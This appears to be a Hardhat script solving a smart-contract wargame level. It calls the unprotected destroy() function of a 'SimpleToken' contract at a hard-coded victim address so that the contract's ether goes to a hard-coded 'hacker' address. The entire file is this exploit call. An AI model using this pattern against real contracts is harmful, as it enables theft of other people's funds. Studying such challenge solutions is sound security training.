// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function main() {
 //! victim contract can be traced by etherscan ... just checked the level origin and see 0.001 eth transfer
  const victimAddr="0x1841Fa7387f367555e5C3230B45613443C447610"
 //? your address for the fund to be returned...  
  const hackerAddr="0x92e5c70Dd41824a0617e07271A7E1e81A9BcE064"

  //! create contract object 
  const simpleToken = await hre.ethers.getContractAt("SimpleToken",victimAddr);
  //! Attack initiated..
  const tx=await simpleToken.destroy(hackerAddr)

  console.log("Hack tx:",tx)
  

  
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
